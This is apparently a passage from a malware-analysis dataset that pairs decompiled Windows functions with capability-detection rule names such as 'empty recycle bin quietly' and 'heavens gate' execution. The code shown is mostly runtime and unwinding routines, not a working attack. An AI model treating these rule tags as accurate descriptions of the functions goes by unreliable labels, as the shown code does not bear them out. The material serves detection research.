        "decompiled_code": "\nulong __fastcall fcn.0041b400(uint param_1, uint param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    int32_t extraout_EDX;\n    uint *puVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint auStack284 [32];\n    uint auStack156 [18];\n    uint uStack84;\n    uint uStack80;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = param_2;\n    if (*(param_3 + 0xc) == 0) {\n        uVar6 = fcn.0041b160(param_3);\n        return uVar6;\n    }\n    uStack24 = in_EAX;\n    fcn.0041a910();\n    puVar4 = auStack284;\n    puVar5 = auStack156;\n    for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = fcn.0041ac40();\n    if (iVar3 == 7) {\n        fcn.0041ad70();\n        fcn.0041b150(uStack84, uStack80);\n        *(&stack0x00000000 + extraout_EDX) = uStack80;\n        return CONCAT44(uStack20, uStack24);\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar2 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x50c0f8, 0x54901c);\n    }\n    uVar6 = fcn.004014c0(fcn.00401590);\n    return uVar6;\n}\n",
        "token_count": 616
    },
    "00428e50": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint32_t ** fcn.00428e50(void)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    uint32_t **ppuVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t **ppuVar5;\n    uint32_t **ppuVar6;\n    uint32_t uVar7;\n    uint32_t **ppuVar8;\n    uint32_t *unaff_EDI;\n    ulong uVar9;\n    \n    if (*0x4f59f4 == 0) {\n        uVar7 = in_EAX + 0x10;\n        if (uVar7 < 8) {\n            uVar7 = 8;\n        }\n        if (*0x4f5ce0 != NULL) {\ncode_r0x00428e88:\n            ppuVar5 = uVar7 + 0xf & 0xfffffff0;\n            ppuVar8 = **0x4f5ce0;\n            ppuVar2 = *0x4f5ce0;\n            if (ppuVar8 < ppuVar5) {\n                do {\n                    ppuVar6 = ppuVar2;\n                    ppuVar2 = ppuVar6[1];\n                    if (ppuVar2 == NULL) goto code_r0x00428ea2;\n                    ppuVar8 = *ppuVar2;\n                } while (ppuVar8 < ppuVar5);\n                ppuVar6 = ppuVar6 + 1;\n            }\n            else {\n                ppuVar6 = 0x4f5ce0;\n            }\n            uVar9 = CONCAT44(ppuVar6, ppuVar2);\n            unaff_EDI = ppuVar2[1];\n            if (ppuVar8 - ppuVar5 < 8) goto code_r0x00428f00;\n            puVar1 = ppuVar2 + ppuVar5;\n            puVar1[1] = unaff_EDI;\n            ppuVar2 = *ppuVar6;\n            *puVar1 = ppuVar8 - ppuVar5;\n            *ppuVar2 = ppuVar5;\n            *ppuVar6 = puVar1;\n            goto code_r0x00428edd;\n        }\n        ppuVar8 = NULL;\n    }\n    else {\n        iVar3 = fcn.00418d60(0x4f5cd8);\n        if (iVar3 != 0) {\n            uVar9 = fcn.0042a720();\n            if (uVar9 >> 0x20 == -1) {\n                fcn.004a37a0(uVar9);\n            }\n            fcn.0041b360();\n            if (*0x4f59f4 != 0) {\n                fcn.00418d00(0x4f5cd8);\n            }\n            *0x4f5ce8 = 0x4a00;\n            puVar4 = sub.msvcrt.dll_malloc(0x4a00);\n            *0x4f5ce4 = puVar4;\n            if (puVar4 == NULL) {\n                *0x4f5ce8 = 0;\n                *0x4f5ce0 = NULL;\n            }\n            else {\n                *0x4f5ce0 = puVar4;\n                *puVar4 = 0x4a00;\n                puVar4[1] = 0;\n            }\n            ppuVar8 = fcn.004014c0(0x4a43f0);\n            return ppuVar8;\n        }\n        uVar7 = in_EAX + 0x10;\n        if (uVar7 < 8) {\n            uVar7 = 8;\n        }\n        if (*0x4f5ce0 != NULL) goto code_r0x00428e88;\ncode_r0x00428ea2:\n        ppuVar8 = NULL;\n        while ((*0x4f59f4 != 0 && (iVar3 = fcn.00418dc0(0x4f5cd8),  iVar3 != 0))) {\n            uVar9 = fcn.0042a750();\ncode_r0x00428f00:\n            ppuVar2 = uVar9;\n            *ppuVar2 = ppuVar8;\n            *(uVar9 >> 0x20) = unaff_EDI;\ncode_r0x00428edd:\n            ppuVar8 = ppuVar2 + 4;\n        }\n    }\n    return ppuVar8;\n}\n",
        "token_count": 1006
    },
    "00419130": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00419130(int32_t param_1, uint8_t *param_2, uint *param_3)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint8_t *in_EAX;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    uint *puVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint *puVar14;\n    uint *var_8h;\n    uint uStack64;\n    uint *var_38h;\n    int32_t var_34h;\n    uint8_t *var_30h;\n    int32_t var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    var_8h[0x24] = 0;\n    if (in_EAX < param_2) {\n        var_2ch = *(param_1 + 0x60);\n        uVar13 = var_8h[0x29];\n        if (uVar13 < *(param_1 + 0x4c) - (var_2ch >> 0x1f)) {\n            var_38h = NULL;\n            var_34h = param_1;\n            var_30h = param_2;\n            do {\n                uVar5 = *in_EAX;\n                puVar10 = in_EAX + 1;\n                uVar7 = *in_EAX & 0xc0;\n                if (uVar7 == 0x40) {\n                    var_8h[0x29] = (uVar5 & 0x3f) * var_8h[0x2c] + uVar13;\n                    goto code_r0x004191a2;\n                }\n                if (uVar7 == 0x80) {\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    iVar3 = var_8h[0x2b];\n                    if ((uVar5 & 0x3f) < 0x12) {\n                        (var_8h + (uVar5 & 0x3f) * 2)[1] = 1;\n                        var_8h[(uVar5 & 0x3f) * 2] = uVar13 * iVar3;\n                    }\n                    goto code_r0x004191a2;\n                }\n                if (uVar7 == 0xc0) {\n                    if ((uVar5 & 0x3f) < 0x12) {\n                        var_8h[(uVar5 & 0x3f) * 2 + 1] = 0;\n                    }\n                    goto code_r0x004191a2;\n                }\n    // switch table (48 cases) at 0x5055b0\n                switch(uVar5) {\n                case 0:\n                case 0x2d:\n                    break;\n                case 1:\n                    fcn.004190f0();\n                    puVar10 = fcn.00418fb0(&var_1ch);\n                    var_8h[0x29] = var_1ch;\n                    break;\n                case 2:\n                    puVar10 = in_EAX + 2;\n                    var_8h[0x29] = in_EAX[1] * var_8h[0x2c] + uVar13;\n                    break;\n                case 3:\n                    puVar10 = in_EAX + 3;\n                    var_8h[0x29] = *(in_EAX + 1) * var_8h[0x2c] + uVar13;\n                    break;\n                case 4:\n                    puVar10 = in_EAX + 5;\n                    var_8h[0x29] = var_8h[0x2c] * *(in_EAX + 1) + uVar13;\n                    break;\n                case 5:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar12 = uVar12 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    goto code_r0x00419367;\n                case 6:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    goto code_r0x004193ab;\n                case 7:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2 + 1] = 6;\n                    }\n                    break;\n                case 8:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\ncode_r0x004193ab:\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2 + 1] = 0;\n                    }\n                    break;\n                case 9:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar5 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar5 = uVar5 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        (var_8h + uVar13 * 2)[1] = 2;\n                        var_8h[uVar13 * 2] = uVar5;\n                    }\n                    break;\n                case 10:\n                    if (var_38h == NULL) {\n                        fcn.00418950();\n                        puVar6 = &uStack64;\n                    }\n                    else {\n                        puVar6 = var_38h;\n                        var_38h = var_38h[0x24];\n                    }\n                    puVar11 = var_8h;\n                    puVar14 = puVar6;\n                    for (iVar3 = 0x29; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar14 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar14 = puVar14 + 1;\n                    }\n                    var_8h[0x24] = puVar6;\n                    break;\n                case 0xb:\n                    puVar6 = var_8h[0x24];\n                    puVar11 = puVar6;\n                    puVar14 = var_8h;\n                    for (iVar3 = 0x29; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar14 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar14 = puVar14 + 1;\n                    }\n                    puVar6[0x24] = var_38h;\n                    var_38h = puVar6;\n                    break;\n                case 0xc:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar7 = 0;\n                    var_8h[0x26] = uVar13;\n                    uVar13 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    var_8h[0x25] = uVar13;\n                    var_8h[0x28] = 1;\n                    break;\n                case 0xd:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    var_8h[0x26] = uVar13;\n                    var_8h[0x28] = 1;\n                    break;\n                case 0xe:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    var_8h[0x25] = uVar13;\n                    break;\n                case 0xf:\n                    uVar7 = 0;\n                    var_8h[0x27] = puVar10;\n                    var_8h[0x28] = 2;\n                    uVar13 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    puVar10 = puVar9 + uVar13;\n                    break;\n                case 0x10:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        (var_8h + uVar13 * 2)[1] = 0x3;\n                        var_8h[uVar13 * 2] = puVar9;\n                    }\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    puVar10 = puVar10 + uVar13;\n                    break;\n                case 0x11:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar5 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar5;\n                        uVar5 = uVar5 + 7;\n                        uVar12 = uVar12 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar5 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar12 = uVar12 | -(1 << (uVar5 & 0x1f));\n                    }\ncode_r0x00419367:\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2] = uVar12 * var_8h[0x2b];\n                        (var_8h + uVar13 * 2)[1] = 1;\n                    }\n                    break;\n                case 0x12:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar5 = 0;\n                    var_8h[0x26] = uVar13;\n                    uVar13 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar5;\n                        uVar5 = uVar5 + 7;\n                        uVar13 = uVar13 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar5 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar13 = uVar13 | -(1 << (uVar5 & 0x1f));\n                    }\n                    var_8h[0x28] = 1;\n                    var_8h[0x25] = uVar13 * var_8h[0x2b];\n                    break;\n                case 0x13:\n                    uVar5 = 0;\n                    uVar13 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar13;\n                        uVar13 = uVar13 + 7;\n                        uVar5 = uVar5 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar13 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar5 = uVar5 | -(1 << (uVar13 & 0x1f));\n                    }\n                    var_8h[0x25] = uVar5 * var_8h[0x2b];\n                    break;\n                case 0x14:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar12 = uVar12 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    goto code_r0x004197b7;\n                case 0x15:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar5 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar5;\n                        uVar5 = uVar5 + 7;\n                        uVar12 = uVar12 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar5 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar12 = uVar12 | -(1 << (uVar5 & 0x1f));\n                    }\ncode_r0x004197b7:\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2] = uVar12 * var_8h[0x2b];\n                        (var_8h + uVar13 * 2)[1] = 4;\n                    }\n                    break;\n                case 0x16:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        (var_8h + uVar13 * 2)[1] = 0x5;\n                        var_8h[uVar13 * 2] = puVar9;\n                    }\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    puVar10 = puVar10 + uVar13;\n                    break;\n                default:\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n                    if (iVar3 == 0) {\n                        *0x4ae004 = 0x41ca80;\n                        pcVar4 = 0x41c830;\n                    }\n                    else {\n                        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n                        *0x4ae004 = (*pcVar2)(iVar3, \"__deregister_frame_info\");\n                    }\n                    if (pcVar4 != NULL) {\n                        (*pcVar4)(0x50c0f8, 0x54901c);\n                    }\n                    fcn.004014c0(fcn.00401590);\n                    return;\n                case 0x2e:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    *(var_34h + 0x68) = uVar13;\n                    break;\n                case 0x2f:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar5 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar5 = uVar5 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2] = -(uVar5 * var_8h[0x2b]);\n                        (var_8h + uVar13 * 2)[1] = 1;\n                    }\n                }\ncode_r0x004191a2:\n                if (var_30h <= puVar10) {\n                    return;\n                }\n                uVar13 = var_8h[0x29];\n                var_2ch = *(var_34h + 0x60);\n                in_EAX = puVar10;\n            } while (uVar13 < *(var_34h + 0x4c) - (var_2ch >> 0x1f));\n        }\n    }\n    return;\n}\n",
        "token_count": 6080
    },
    "00419fb0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00419fb0(int32_t param_1, uint8_t *param_2, int32_t *param_3)\n\n{\n    int32_t **ppiVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    uint8_t *in_EAX;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint *puVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    uint8_t extraout_DL;\n    uint8_t *puVar13;\n    int32_t **unaff_EBP;\n    int32_t **unaff_EDI;\n    uint32_t uVar14;\n    int32_t **ppiStack312;\n    int32_t *piStack292;\n    int32_t **ppiStack288;\n    int32_t *apiStack284 [67];\n    \n    apiStack284[0] = param_3;\n    if (in_EAX < param_2) {\n        ppiStack312 = 0x1;\n        do {\n            uVar10 = *in_EAX;\n            uVar7 = uVar10;\n            puVar8 = in_EAX + 1;\n    // switch table (239 cases) at 0x505670\n            switch(uVar7 - 3 & 0xff) {\n            case 0:\n            case 9:\n            case 10:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 5;\n                break;\n            default:\ncode_r0x0041a4a9:\n                do {\n                    sub.msvcrt.dll_abort();\n                    uVar10 = extraout_DL;\ncode_r0x0041a4b0:\n                    ppiStack312 = unaff_EBP;\n                    if (uVar10 == 6) {\n                        unaff_EDI = *unaff_EDI;\n                        goto code_r0x0041a010;\n                    }\n                } while (uVar10 != 0x19);\n                unaff_EDI = (unaff_EDI ^ unaff_EDI >> 0x1f) - (unaff_EDI >> 0x1f);\n                break;\n            case 3:\n            case 0x16:\n            case 0x1c:\n            case 0x1d:\n            case 0x20:\n            case 0x91:\n                if (ppiStack312 == NULL) goto code_r0x004014e0;\n                unaff_EBP = ppiStack312 + -1;\n                unaff_EDI = apiStack284[unaff_EBP];\n                ppiStack312 = unaff_EBP;\n                if (uVar10 == 0x1f) {\n                    unaff_EDI = -unaff_EDI;\n                }\n                else {\n                    if (uVar10 < 0x20) goto code_r0x0041a4b0;\n                    if (uVar10 == 0x23) {\n                        uVar7 = 0;\n                        uVar10 = 0;\n                        puVar13 = puVar8;\n                        do {\n                            puVar8 = puVar13 + 1;\n                            uVar11 = *puVar13;\n                            uVar2 = uVar10 & 0x1f;\n                            uVar10 = uVar10 + 7;\n                            uVar7 = uVar7 | (uVar11 & 0x7f) << uVar2;\n                            puVar13 = puVar8;\n                        } while (uVar11 < '\\0');\n                        unaff_EDI = unaff_EDI + uVar7;\n                    }\n                    else if (uVar10 == 0x94) {\n                        uVar10 = in_EAX[1];\n                        puVar13 = in_EAX + 2;\n                        if (uVar10 == 2) {\n                            unaff_EDI = *unaff_EDI;\n                            puVar8 = puVar13;\n                        }\n                        else if (uVar10 < 3) {\n                            if (uVar10 != 1) goto code_r0x0041a4a9;\n                            unaff_EDI = *unaff_EDI;\n                            puVar8 = puVar13;\n                        }\n                        else {\n                            if ((uVar10 != 4) && (uVar10 != 8)) goto code_r0x0041a4a9;\n                            unaff_EDI = *unaff_EDI;\n                            puVar8 = puVar13;\n                        }\n                    }\n                    else {\n                        if (uVar10 != 0x20) goto code_r0x0041a4a9;\n                        unaff_EDI = ~unaff_EDI;\n                    }\n                }\n                break;\n            case 5:\n                unaff_EDI = in_EAX[1];\n                puVar8 = in_EAX + 2;\n                break;\n            case 6:\n                unaff_EDI = in_EAX[1];\n                puVar8 = in_EAX + 2;\n                break;\n            case 7:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 3;\n                break;\n            case 8:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 3;\n                break;\n            case 0xb:\n            case 0xc:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 9;\n                break;\n            case 0xd:\n                unaff_EDI = NULL;\n                uVar10 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar11 = *puVar13;\n                    uVar2 = uVar10 & 0x1f;\n                    uVar10 = uVar10 + 7;\n                    unaff_EDI = unaff_EDI | (uVar11 & 0x7f) << uVar2;\n                    puVar13 = puVar8;\n                } while (uVar11 < '\\0');\n                break;\n            case 0xe:\n                unaff_EDI = NULL;\n                uVar7 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar10 = *puVar13;\n                    uVar11 = uVar7;\n                    uVar7 = uVar7 + 7;\n                    unaff_EDI = unaff_EDI | (uVar10 & 0x7f) << (uVar11 & 0x1f);\n                    puVar13 = puVar8;\n                } while (uVar10 < '\\0');\n                if ((uVar7 < 0x20) && ((uVar10 & 0x40) != 0)) {\n                    unaff_EDI = unaff_EDI | -(1 << (uVar7 & 0x1f));\n                }\n                break;\n            case 0xf:\n                if (ppiStack312 == NULL) goto code_r0x004014e0;\n                unaff_EDI = (&piStack292)[ppiStack312 + 1];\n                break;\n            case 0x10:\n                if (ppiStack312 != NULL) {\n                    ppiStack312 = ppiStack312 + -1;\n                    goto code_r0x0041a024;\n                }\n                goto code_r0x004014e0;\n            case 0x11:\n                if (ppiStack312 < 2) goto code_r0x004014e0;\n                unaff_EDI = (&piStack292)[ppiStack312];\n                break;\n            case 0x12:\n                puVar8 = in_EAX + 2;\n                if (ppiStack312 + -1 <= in_EAX[1]) goto code_r0x004014e0;\n                unaff_EDI = apiStack284[(ppiStack312 + -1) - in_EAX[1]];\n                break;\n            case 0x13:\n                if (1 < ppiStack312) {\n                    piVar6 = apiStack284[ppiStack312 + -1];\n                    apiStack284[ppiStack312 + -1] = apiStack284[ppiStack312 + -2];\n                    apiStack284[ppiStack312 + -2] = piVar6;\n                    goto code_r0x0041a024;\n                }\n                